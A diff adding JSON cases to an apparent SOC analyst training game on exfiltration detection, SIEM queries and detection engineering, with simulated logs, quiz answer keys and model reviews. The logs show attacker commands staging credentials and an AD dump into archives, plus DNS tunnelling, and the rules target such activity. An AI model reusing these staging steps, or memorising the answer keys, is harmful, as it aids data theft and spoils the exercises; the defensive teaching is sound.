+   "Legitimate comparison: telemetry agent on all hosts beacons to 13.107.42.14:443 every 300s, ja3=e7d705a3286e19ea42f587b344ee6865, valid Microsoft certificate"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Primary external C2 IP and port","type":"keywords","accept":["91.203.5.12:8443","91.203.5.12"],"hint":"One destination carries the HTTPS POST channel for multiple hosts."},
+  {"id":"q2","label":"Primary beacon interval in seconds","type":"num","accept":["600"],"hint":"Average the interval across the first two channels."},
+  {"id":"q3","label":"Which host uses a long-sleep secondary channel, and what is its interval in seconds?","type":"keywords","accept":["3600","srv-file02 3600","file02 3600","3600 srv-file02"],"hint":"One channel has a much longer interval and larger jitter."},
+  {"id":"q4","label":"Which two hosts have no direct internet route and therefore pivot internally?","type":"keywords","accept":["srv-hr01","srv-sql01","hr01","sql01"],"hint":"Look at the internal channels panel - which hosts talk to SRV-FILE02 on 445 instead of the internet?"},
+  {"id":"q5","label":"What internal transport do they use?","type":"keywords","accept":["named pipe","pipe","smb","445","nwsync_9f21"],"hint":"Read the connection detail on the internal sessions."},
+  {"id":"q6","label":"Which host acts as the relay to the internet?","type":"exact","accept":["srv-file02","file02"],"hint":"Only one compromised host has both an internet route and server-VLAN reachability."},
+  {"id":"q7","label":"Which fingerprint links this activity to a prior incident?","type":"keywords","accept":["ja3","51c64c77","tls fingerprint"],"hint":"One enrichment line names an artefact seen in January at a subsidiary."},
+  {"id":"q8","label":"Why would blocking 91.203.5.12 alone be insufficient?","type":"keywords","accept":["dns","tunnel","datasync","pipe","internal","relay","pivot","second channel","txt","other channel"],"hint":"Count the distinct channels: HTTPS, DNS and internal SMB pipes."},
+  {"id":"q9","label":"Is the 300s beacon to 13.107.42.14 malicious? (yes/no)","type":"exact","accept":["no"],"hint":"Compare its JA3, certificate validity and destination against the legitimate comparison line."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["block","sinkhole","isolate","segment","simultaneous","coordinated","egress","ja3"],"text":"Execute one coordinated action: block the 91.203.5.0/24 range and all three domains, sinkhole DNS, add JA3 detection, and isolate all four hosts simultaneously so the internal pipe relay dies with the external channel."},
+ "timelineKey":["08:31","10:02","10:22","10:46"],
+ "hints":["Not every implant talks to the internet. Two hosts have no route out at all, yet they are still being controlled - find what they are talking to instead.","Count the channels by transport: HTTPS on a ten-minute cadence, HTTPS on a one-hour cadence, DNS TXT in bursts, and internal SMB named pipes. The block list needs all four."],
+ "review":"Four distinct channels. Primary HTTPS beaconing to 91.203.5.12:8443 POST /gate.php at 600 seconds from WKS-2041 and SRV-LNX-04, sharing a JA3 fingerprint that also appeared in a January incident at a Northwind subsidiary attributed to the same actor. A long-sleep secondary on SRV-FILE02 at 3600 seconds, designed to survive exactly the kind of block you are about to issue. DNS tunnelling in burst windows from SRV-FILE02 for data movement. And an internal pivot: SRV-HR01 and SRV-SQL01 have no internet route, so they are controlled through SMB named pipes (\\\\.\\pipe\\nwsync_9f21, the mutex name reused) relayed by SRV-FILE02. Blocking the external IP alone would leave the long-sleep channel, the DNS tunnel and the internal relay intact - which is why containment must be simultaneous.",
+ "next":"The DNS tunnel from the finance file server has been running in bursts for a day. Quantify what left the estate."
+},
+{
+ "id":22,"title":"Data Exfiltration Detection","domain":"Data Security","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Exfiltration normally has three phases: collection (finding and reading the data), staging (compressing and often encrypting it into an archive, frequently in a temp or public directory), and transfer (over C2, DNS, cloud storage, email or removable media). Each phase leaves different evidence, and the staging archive is usually the best single artefact for quantifying impact.",
+  "why":"Impact assessment, regulatory notification and negotiation posture all depend on what actually left, not what could have.",
+  "look":["Archive creation (.7z, .zip, .rar) in %TEMP%, %PROGRAMDATA% or /tmp containing business documents","Volume asymmetry outbound, or sustained small transfers over DNS","Uploads to personal cloud storage from servers","File access counts far above a user's baseline","Deleted staging archives shortly after a transfer completes"],
+  "fp":["Backup, DR replication and legitimate cloud migration produce enormous outbound volumes","Analytics and reporting jobs read thousands of files by design"],
+  "tips":["Convert DNS tunnel volume to bytes: labels carry a limited payload per query, so queries times payload gives a credible estimate.","Record file counts and classifications; the privacy and legal teams need them, not a description of the traffic."]
+ },
+ "case":{"id":"SOC-2026-00677","severity":"CRITICAL","alert":"Data staging and covert transfer from finance file server","host":"SRV-FILE02","time":"2026-03-04 10:00 - 03-05 00:00","source":"EDR file telemetry / DNS / file audit","brief":"Determine what data was collected, how it was staged, how it left, and produce a defensible estimate of the volume transferred. Legal and the privacy officer depend on this number."},
+ "mitre":"T1074.001 Local Data Staging / T1560.001 Archive via Utility / T1048.003 Exfiltration Over Alternative Protocol",
+ "evidence":[
+  {"name":"File Activity - SRV-FILE02","rows":[
+   "09:58:11 proc=svc.exe user=SYSTEM action=file_read path=\\Finance$\\Payroll\\2026\\*.xlsx count=214 total=186MB",
+   "10:00:02 proc=svc.exe action=file_read path=\\Finance$\\Contracts\\*.pdf count=1,102 total=1.4GB",
+   "10:00:40 proc=svc.exe action=file_read path=\\HR$\\Personnel\\*.pdf count=0 (access denied - share ACL)",
+   "10:01:20 proc=svc.exe cmd=\"7z.exe a -mx9 -pN0rthw1nd2026 C:\\ProgramData\\cache\\d1.7z \\\\SRV-FILE02\\Finance$\\Payroll \\\\SRV-FILE02\\Finance$\\Contracts\"",
+   "10:01:55 file_write C:\\ProgramData\\cache\\d1.7z size=248MB sha256=f31c09ab77e2...",
+   "10:02:01 dns_tunnel_start domain=datasync-77x.net (see DNS panel)",
+   "14:09:40 proc=svc.exe cmd=\"7z.exe a -mx9 -pN0rthw1nd2026 C:\\ProgramData\\cache\\d2.7z \\\\SRV-SQL01\\dbexport\\finance_q1.bak\"",
+   "14:10:02 file_write C:\\ProgramData\\cache\\d2.7z size=96MB",
+   "22:04:10 proc=svc.exe cmd=\"7z.exe a -mx9 -pN0rthw1nd2026 C:\\ProgramData\\cache\\d3.7z C:\\ProgramData\\cache\\creds.txt C:\\ProgramData\\cache\\ad_dump.dit\"",
+   "23:58:02 proc=svc.exe action=file_delete path=C:\\ProgramData\\cache\\d1.7z,d2.7z,d3.7z (deleted after transfer; recovered from volume shadow copy)"
+  ]},
+  {"name":"DNS Tunnel Volume","rows":[
+   "Window 1: 10:02:01-10:34:40 queries=1,902 avg_payload=180 bytes/query",
+   "Window 2: 14:10:11-14:38:02 queries=1,640 avg_payload=180 bytes/query",
+   "Window 3: 22:05:00-22:41:30 queries=2,110 queries avg_payload=180 bytes/query",
+   "Total queries across windows: 5,652",
+   "Note: base32-encoded payload in subdomain labels; 180 bytes/query is the measured average after encoding overhead"
+  ]},
+  {"name":"Context and Comparison","rows":[
+   "Finance$ share classification: CONFIDENTIAL - payroll (contains national ID and salary data for 1,840 employees), vendor contracts",
+   "HR$ share ACL denied the attacker - personnel records were NOT accessed",
+   "Legitimate comparison: nightly DR replication 02:00-04:00 SRV-FILE02 -> 198.18.44.9, 412GB, rule FW-BACKUP-07 (CHG-1188)",
+   "Archive password N0rthw1nd2026 recovered from the command line - archives decryptable for confirmation of contents"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"What utility was used to stage the data?","type":"keywords","accept":["7z","7z.exe","7-zip"],"hint":"Read the cmd field on the staging events."},
+  {"id":"q2","label":"Where were the archives written?","type":"keywords","accept":["c:\\programdata\\cache","programdata\\cache","programdata"],"hint":"All three archives share one directory."},
+  {"id":"q3","label":"How many archives were created?","type":"num","accept":["3"],"hint":"Count the 7z commands - d1, d2, d3."},
+  {"id":"q4","label":"Which share did the attacker fail to access?","type":"keywords","accept":["hr$","hr","personnel"],"hint":"One file_read returned count=0."},
+  {"id":"q5","label":"Approximately how many megabytes left via the DNS tunnel? (5,652 queries x 180 bytes)","type":"num","accept":["1","1.0","0.97","1.02"],"hint":"Multiply queries by payload, then convert bytes to megabytes. The answer is surprisingly small - and that matters."},
+  {"id":"q6","label":"Given that answer, did all 344MB of archives leave via DNS? (yes/no)","type":"exact","accept":["no"],"hint":"Compare the DNS tunnel capacity with the total archive size."},
+  {"id":"q7","label":"What is the most likely primary exfiltration channel for the bulk data?","type":"choice","options":["The HTTPS C2 channel to 91.203.5.12","The DNS tunnel alone","The nightly DR replication","Physical removable media"],"accept":["the https c2 channel to 91.203.5.12"],"hint":"Which channel from the previous case has the bandwidth for hundreds of megabytes?"},
+  {"id":"q8","label":"How many employees' payroll records are in scope for notification?","type":"num","accept":["1840","1,840"],"hint":"Read the share classification line."},
+  {"id":"q9","label":"Why did the attacker delete the archives at 23:58?","type":"keywords","accept":["cover","anti-forensic","hide","evade","track","evidence","conceal","clean"],"hint":"Consider what the archives would prove if found - and note that shadow copies defeated the attempt."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["notify","legal","privacy","preserve","contain","block","regulator","breach","escalate"],"text":"Declare a confirmed data breach: preserve the recovered archives and shadow copies as evidence, notify legal and the privacy officer with the 1,840-employee scope, and treat the AD dump as full domain credential compromise."},
+ "timelineKey":["09:58:11","10:01:20","10:02:01","23:58:02"],
+ "hints":["Work the three phases in order: what was read, what was packed, and what left. Each phase has its own evidence panel.","Do the DNS arithmetic yourself before assuming the tunnel carried everything. The gap between what was staged and what DNS could carry tells you there is another channel."],
+ "review":"Collection: 214 payroll spreadsheets (186 MB) and 1,102 contract PDFs (1.4 GB) read as SYSTEM; the HR personnel share refused access, so those records are out of scope - a detail the privacy officer needs stated explicitly. Staging: three password-protected 7-Zip archives in C:\\ProgramData\\cache totalling roughly 344 MB, with the password visible in the command line, so contents can be confirmed. Transfer: the DNS tunnel moved 5,652 queries at 180 bytes, about 1 MB in total - far too little for 344 MB, which proves the bulk went out over the HTTPS C2 channel and makes the DNS tunnel a low-bandwidth control and overflow path rather than the main route. Archive d3 is the worst of it: harvested credentials and an Active Directory database dump. The archives were deleted at 23:58 to frustrate forensics but were recovered from volume shadow copies. Scope for notification is 1,840 employees.",
+ "next":"You have the full technical picture on four hosts. Now it must be reproduced as a correlated investigation inside the SIEM, using query syntax rather than curated evidence panels - the way it would be done on a real console."
+},
+{
+ "id":23,"title":"SIEM Investigation","domain":"SIEM","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"A SIEM normalises logs from many sources into common fields and lets the analyst search, filter, aggregate and correlate across them. The workflow is always the same: scope a time window, filter to relevant sources, pivot on an entity (IP, user, host, hash), aggregate to spot outliers, then correlate across sources to build the sequence.",
+  "why":"Curated evidence panels do not exist in real life. The analyst has to build the picture with queries.",
+  "look":["Field names and their normalised equivalents: src_ip, dest_ip, user, host, event_id, process","Aggregations: count by source, distinct destinations per account, events per minute","Time windows that include enough before-and-after context to establish baseline","Correlation across sources: authentication plus process plus network for the same entity"],
+  "fp":["A correlation rule joining on a shared field can produce spurious matches - verify the underlying events","Timezone mismatches between sources create false sequences; normalise to UTC"],
+  "tips":["Pivot on entities, not on alerts. One IP searched across every index beats ten alert reviews.","Always state the time window in your findings; a count without a window is meaningless."]
+ },
+ "case":{"id":"SOC-2026-00688","severity":"HIGH","alert":"Reconstruct the incident using SIEM queries only","host":"Estate","time":"2026-03-04 00:00 - 03-05 06:00 UTC","source":"NW-SIEM","brief":"Tier 2 wants the incident reproduced from the SIEM as it would be presented to an auditor. Use the query results below to answer precisely - every number you report must come from a stated query and window."},
+ "mitre":"N/A - analytical exercise",
+ "evidence":[
+  {"name":"Query: index=auth src_ip=203.0.113.55 | stats count by event_id, account","rows":[
+   "event_id=4625 account=svc_backup count=12",
+   "event_id=4624 account=svc_backup count=1",
+   "event_id=4672 account=svc_backup count=1",
+   "event_id=4625 account=oracle_admin count=1",
+   "event_id=4625 account=backupadmin count=1",
+   "event_id=4625 account=sqlservice count=1",
+   "window: 2026-03-02 00:00 to 2026-03-05 06:00 UTC"
+  ]},
+  {"name":"Query: index=* user=svc_backup2 | stats dc(host) as hosts, count by action","rows":[
+   "action=logon hosts=4 count=7",
+   "action=service_install hosts=2 count=2",
+   "action=share_access hosts=3 count=6",
+   "action=directory_replication hosts=1 count=1",
+   "action=logon_failed hosts=1 count=2",
+   "window: 2026-03-04 02:00 to 2026-03-05 06:00 UTC"
+  ]},
+  {"name":"Query: index=proxy,dns dest=91.203.5.12 OR domain IN (c2 domains) | stats count by host","rows":[
+   "host=SRV-LNX-04 count=142",
+   "host=WKS-2041 count=96",
+   "host=SRV-FILE02 count=5,698",
+   "host=WKS-2077 count=1",
+   "host=SOC-ANALYST-VM01 count=14",
+   "window: 2026-03-04 07:00 to 2026-03-05 06:00 UTC"
+  ]},
+  {"name":"Query: index=edr event=process_create parent=explorer.exe child IN (cmd.exe,powershell.exe) | stats count by host, user","rows":[
+   "host=WKS-2041 user=k.rahman count=3",
+   "host=WKS-2044 user=m.chen count=2",
+   "host=WKS-2011 user=s.dsouza count=1  (note: parent=ccmexec.exe on inspection - normalisation error in this rule)",
+   "host=SRV-APP03 user=adm.tovar count=4  (RDP admin session, ticket INC-20449)",
+   "window: 2026-03-04 08:00 to 2026-03-04 18:00 UTC"
+  ]},
+  {"name":"Query: index=auth event_id=4624 logon_type=3 auth_package=NTLM | timechart span=1h count","rows":[
+   "02:00 count=3 | 08:00 count=41 | 09:00 count=38 | 10:00 count=102 | 11:00 count=96 | 12:00 count=35 | 22:00 count=8",
+   "baseline average for this estate: 30-45 NTLM network logons per hour",
+   "window: 2026-03-04 00:00 to 2026-03-05 00:00 UTC"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Total failed logons from 203.0.113.55 across all accounts","type":"num","accept":["15"],"hint":"Sum every 4625 count in the first query result."},
+  {"id":"q2","label":"How many distinct hosts did svc_backup2 log on to?","type":"num","accept":["4"],"hint":"Read the dc(host) value on the logon action."},
+  {"id":"q3","label":"Which host generated by far the most C2-related network events?","type":"exact","accept":["srv-file02","file02"],"hint":"Compare the counts in the third query - one is two orders of magnitude higher."},
+  {"id":"q4","label":"Why is that host's count so much higher than the others?","type":"keywords","accept":["dns","tunnel","txt","queries","tunnelling","tunneling","exfil"],"hint":"Recall which host ran the DNS tunnel and how many queries it made."},
+  {"id":"q5","label":"Which result in the process-create query is a normalisation error rather than a finding?","type":"exact","accept":["wks-2011","2011"],"hint":"Read the inline notes on the query output."},
+  {"id":"q6","label":"Which hours show NTLM logon volume above the stated baseline?","type":"keywords","accept":["10:00","11:00","10 and 11","10,11","10-11"],"hint":"Compare each hourly count with the 30-45 baseline range."},
+  {"id":"q7","label":"What activity from your earlier investigations explains that spike?","type":"keywords","accept":["lateral","movement","psexec","svc_backup2","dcsync","pivot"],"hint":"What was the attacker doing between 10:20 and 11:31?"},
+  {"id":"q8","label":"Why must the time window be stated with every count?","type":"keywords","accept":["context","compare","baseline","meaningless","reproduc","audit","verify","interpret"],"hint":"Consider how an auditor would reproduce your number."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["document","correlat","rule","tune","detection","report","evidence","query"],"text":"Record every query with its window as evidence in the case file, fix the parent-process normalisation error feeding the false WKS-2011 result, and hand the correlated dataset to detection engineering."},
+ "timelineKey":[],
+ "hints":["Read each query header before the results. The fields being aggregated tell you exactly what question the query was asking.","Two results in these panels are artefacts of the tooling rather than attacker activity - the inline notes give them away."],
+ "review":"Fifteen failed logons from 203.0.113.55 (twelve against svc_backup, three during username enumeration). svc_backup2 authenticated to four distinct hosts, installed services on two, accessed shares on three, and performed one directory replication - the DCSync. SRV-FILE02's 5,698 network events dwarf the others because of the DNS tunnel query volume, not because it beacons more often. The NTLM timechart spikes to 102 and 96 in the 10:00 and 11:00 hours, well above the 30-45 baseline, which corresponds exactly to the PsExec movement window. Two results are noise: WKS-2011 is a parent-process normalisation error (the real parent was ccmexec.exe) and SRV-APP03 is the authorised admin session under INC-20449. Every count here is only meaningful with its window attached, which is why the window is part of the finding, not a footnote.",
+ "next":"The investigation is complete and reproducible. Convert what you have learned into detections so this actor is caught at the first step next time."
+},
+{
+ "id":24,"title":"Detection Engineering","domain":"Detection","tier":"Tier 3","tierNote":"Tier-3 collaboration",
+ "theory":{
+  "concept":"Detection engineering turns incident knowledge into durable rules. A good detection has a clear hypothesis, precise logic, a stated data source requirement, known false positives with documented exceptions, a severity, and a response action. Detections are ranked by durability: hashes and IPs are trivially changed, tool artefacts and infrastructure are harder to change, and behaviours are hardest of all.",
+  "why":"An incident that produces no detections will recur. Rules are the only output of an investigation that keeps working after everyone goes home.",
+  "look":["Which observed artefact is cheapest for the attacker to change, and which is most expensive","Whether the data source required by the rule is actually collected estate-wide","Expected false positive volume and the exception that handles it without blinding the rule","A response action a Tier-1 analyst can execute without further interpretation"],
+  "fp":["Rules written narrowly around one incident break on the next variant","Rules written broadly generate volume nobody triages, which is worse than no rule"],
+  "tips":["Test every candidate rule against historical data before deploying it; count how many hits the last 30 days would have produced.","Write the exception as a condition in the rule, not as a note asking analysts to remember something."]
+ },
+ "case":{"id":"SOC-2026-00694","severity":"MEDIUM","alert":"Post-incident detection development for TA-4411 tradecraft","host":"N/A - engineering","time":"2026-03-05 10:00 UTC","source":"Detection backlog","brief":"Select and evaluate detection candidates from the incident. Each candidate has been backtested against 30 days of historical data - use those results to decide what ships, what needs tuning, and what must be rejected."},
+ "mitre":"Multiple",
+ "evidence":[
+  {"name":"Candidate Detections and Backtest Results","rows":[
+   "D1 hash=b17d4f9a2c6e8811... | backtest hits: 1 | FP: 0 | durability: LOW (attacker rebuilt binary within hours; missed SRV-FILE02 entirely)",
+   "D2 mutex Global\\NWSYNC_9F21 present | backtest hits: 3 | FP: 0 | durability: HIGH (matched rebuilt variant) | data source: EDR, collected estate-wide",
+   "D3 http.user_agent contains 'NorthSync' | backtest hits: 4 | FP: 1 (northsync-analytics.com, Sales SaaS) | durability: HIGH",
+   "D4 process_create where parent=explorer.exe AND child=cmd.exe | backtest hits: 4,218 | FP: ~4,210 | durability: N/A",
+   "D5 .lnk file executed from a path under AppData\\Local\\Temp within 300s of an archive extraction | backtest hits: 2 | FP: 0 | durability: HIGH",
+   "D6 EventID=7045 where service binary path NOT IN (System32, Program Files) AND binary unsigned | backtest hits: 5 | FP: 3 (two vendor agents, one legacy app) | durability: MEDIUM",
+   "D7 dns.query_type=TXT AND count by host > 200 in 10 minutes | backtest hits: 2 | FP: 1 (mail security appliance doing SPF/DKIM lookups) | durability: HIGH",
+   "D8 EventID=4728 where target_group='Domain Admins' | backtest hits: 3 | FP: 2 (both matched a change ticket) | durability: HIGH",
+   "D9 dest_ip=91.203.5.12 | backtest hits: 246 | FP: 0 | durability: LOW (single address, trivially rotated)"
+  ]},
+  {"name":"Data Source Coverage","rows":[
+   "EDR process and mutex telemetry: 98% of Windows endpoints, 0% of Linux servers",
+   "DNS resolver logs: 100% of estate",
+   "PowerShell 4104 script block logging: 100% Windows since 2026-02-10",
+   "Proxy user-agent logging: 94% (guest network excluded)",
+   "Linux auditd: 40% of Linux estate - coverage gap"
+  ]},
+  {"name":"Rule Quality Standard","rows":[
+   "Ship as-is: backtest FP rate below 10% of hits and durability MEDIUM or higher",
+   "Ship with exception: FP source identifiable and expressible as a rule condition",
+   "Reject: FP volume unmanageable, or detection trivially evaded, or required data source not collected",
+   "All shipped rules require: severity, response action, MITRE technique, owner"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which candidate must be rejected outright for unmanageable false positives?","type":"exact","accept":["d4"],"hint":"One candidate produced over four thousand backtest hits."},
+  {"id":"q2","label":"Which two candidates are low durability because the attacker can change the artefact cheaply?","type":"keywords","accept":["d1","d9","d1 and d9","d1,d9"],"hint":"Which artefacts did this actor demonstrably change or could rotate in minutes?"},
+  {"id":"q3","label":"Which candidate detected the rebuilt variant that the hash rule missed?","type":"exact","accept":["d2"],"hint":"Look for the behavioural artefact that matched three hosts."},
+  {"id":"q4","label":"D3 has one false positive. Write the exception condition in plain terms.","type":"keywords","accept":["exclude","northsync-analytics","analytics","domain","sales","saas","destination"],"hint":"Name the specific destination that caused the false hit and exclude it rather than dropping the rule."},
+  {"id":"q5","label":"Which shipped rule would be blind on Linux hosts, and why?","type":"keywords","accept":["d2","edr","no linux","coverage","0%","not collected"],"hint":"Cross-reference the rule's data source with the coverage panel."},
+  {"id":"q6","label":"D7 has a mail appliance false positive. Should the rule ship? (yes/no)","type":"exact","accept":["yes"],"hint":"Apply the quality standard - is the FP source identifiable and expressible as a condition?"},
+  {"id":"q7","label":"Why does D8 still ship despite two of three hits being false positives?","type":"keywords","accept":["change ticket","ticket","high value","severity","critical","worth","verify","impact","rare"],"hint":"Consider the cost of reviewing three alerts a month against the cost of missing a Domain Admins addition."},
+  {"id":"q8","label":"Which coverage gap most urgently needs remediation based on this incident?","type":"keywords","accept":["linux","auditd","40%","linux estate"],"hint":"The intrusion's first foothold was on a platform with the weakest telemetry."},
+  {"id":"q9","label":"Which candidate would have detected the intrusion earliest in the kill chain?","type":"exact","accept":["d5"],"hint":"Which rule fires on the initial user execution rather than on post-compromise behaviour?"}
+ ],
+ "decision":"true_positive","severity_answer":"MEDIUM",
+ "recommend":{"any":["ship","deploy","exception","tune","reject","coverage","auditd","backlog"],"text":"Ship D2, D3 (with an analytics-domain exception), D5, D6 (with vendor-agent exceptions), D7 (with a mail-appliance exception) and D8; reject D4; retire D1 and D9 to low-confidence enrichment; and raise Linux auditd coverage as a priority gap."},
+ "timelineKey":[],
+ "hints":["Rank every candidate on two axes: how much noise it generates and how cheaply the attacker can evade it. Rules that score badly on both are the easy rejects.","A false positive is not automatically disqualifying. Ask whether you can name its cause precisely enough to write it into the rule as a condition."],
+ "review":"D4 is rejected: 4,218 hits with essentially all of them benign is a rule that guarantees a missed real alert. D1 and D9 are demonstrably low durability - the actor rebuilt the binary within hours, which is exactly why the hash rule missed SRV-FILE02, and a single IP rotates in minutes; both become enrichment rather than detections. D2 ships and is the strongest rule here because it caught the rebuilt variant, though it is blind on Linux where EDR coverage is zero. D3, D6 and D7 ship with named exceptions written into the logic rather than left as analyst folklore. D8 ships despite a 2-in-3 false positive rate because three alerts a month is trivial and a missed Domain Admins addition is catastrophic - false positive rate must always be weighed against consequence. D5 is the most valuable strategically: it fires on the initial .lnk execution, before any persistence or C2, which would have cut this entire incident at minute one. The Linux auditd gap at 40 percent is the coverage finding, and the intrusion started on Linux.",
+ "next":"Detections are queued. Now map the full intrusion to a common framework so the report speaks the same language as the rest of the industry."
+}
+]
